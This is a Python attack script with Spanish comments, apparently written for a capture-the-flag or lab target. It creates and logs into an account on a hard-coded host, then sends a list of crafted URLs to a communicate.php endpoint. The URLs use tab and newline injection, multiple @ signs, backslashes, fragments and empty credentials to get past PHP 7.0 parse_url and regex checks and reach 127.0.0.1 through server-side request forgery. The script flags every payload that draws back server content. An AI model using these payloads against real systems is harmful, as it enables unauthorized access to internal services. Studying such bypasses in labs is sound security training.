#!/usr/bin/env python3
"""
Probar bypasses específicos de parse_url en PHP 7.0
"""
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Bypasses conocidos de parse_url en PHP 7.0
test_urls = [
    # Bypass con espacios y tabs
    ("http://motherland.com\t@127.0.0.1/", "Tab antes de @"),
    ("http://motherland.com\n@127.0.0.1/", "Newline antes de @"),
    ("http://motherland.com\r@127.0.0.1/", "CR antes de @"),
    
    # Bypass con URL encoding especial
    ("http://motherland.com%09@127.0.0.1/", "Tab encoded antes de @"),
    ("http://motherland.com%20@127.0.0.1/", "Space encoded antes de @"),
    
    # Bypass con múltiples @
    ("http://motherland.com@@127.0.0.1/", "Doble @"),
    ("http://test@motherland.com@127.0.0.1/", "Múltiples @"),
    
    # Bypass con backslash (Windows style)
    ("http://motherland.com\\127.0.0.1/", "Backslash"),
    ("http://motherland.com\\\\127.0.0.1/", "Doble backslash"),
    
    # Bypass con puerto especial
    ("http://motherland.com:80@127.0.0.1/", "Puerto con @"),
    ("http://motherland.com:@127.0.0.1/", "Puerto vacío con @"),
    
    # Bypass con fragmento
    ("http://motherland.com#@127.0.0.1", "Fragment con @"),
    
    # URLs malformadas que parse_url puede interpretar diferente
    ("http:/motherland.com/", "Una sola /"),
    ("http:///motherland.com/", "Triple /"),
    ("http://motherland.com:80/", "Puerto explícito"),
    ("http://motherland.com:/", "Puerto vacío"),
    
    # Intentos con diferentes espacios
    ("http://motherland.com /", "Espacio antes de /"),
    ("http:// motherland.com/", "Espacio después de //"),
    
    # URLs con path que podría confundir
    ("http://127.0.0.1/motherland.com", "IP con path"),
    ("http://127.0.0.1?host=motherland.com", "IP con query"),
    
    # Bypass con credenciales vacías
    ("http://@motherland.com/", "@ al inicio"),
    ("http://:@motherland.com/", "User vacío"),
    ("http://user:@motherland.com/", "Pass vacío"),
]

for url, description in test_urls:
    print(f"[*] {description}")
    print(f"    URL: {repr(url)}")
    
    data = {
        'url': url,
        'data[test]': 'value'
    }
    
    try:
        resp = session.post(f"{TARGET}/communicate.php", data=data, timeout=10)
        
        if "Wrong URL!" in resp.text:
            print(f"    [-] Wrong URL (regex rechazó)")
        elif "Failed when parsing URL!" in resp.text:
            print(f"    [-] Failed parsing (filter_var falló)")
        elif "cURL Error" in resp.text:
            import re
            match = re.search(r'cURL Error: ([^<]+)', resp.text)
            if match:
                error = match.group(1).strip()
                if "timed out" not in error.lower():
                    print(f"    [!] Error diferente: {error[:80]}")
                else:
                    print(f"    [-] Timeout normal")
        else:
            # Ver si hay contenido en response
            import re
            match = re.search(r'<pre>(.*?)</pre>', resp.text, re.DOTALL)
            if match:
                content = match.group(1).strip()
                if len(content) > 10:
                    print(f"    [+++] ¡RESPUESTA! ({len(content)} chars)")
                    print(f"          {content[:200]}")
    except Exception as e:
        print(f"    [!] Exception: {str(e)[:80]}")
    
    print()
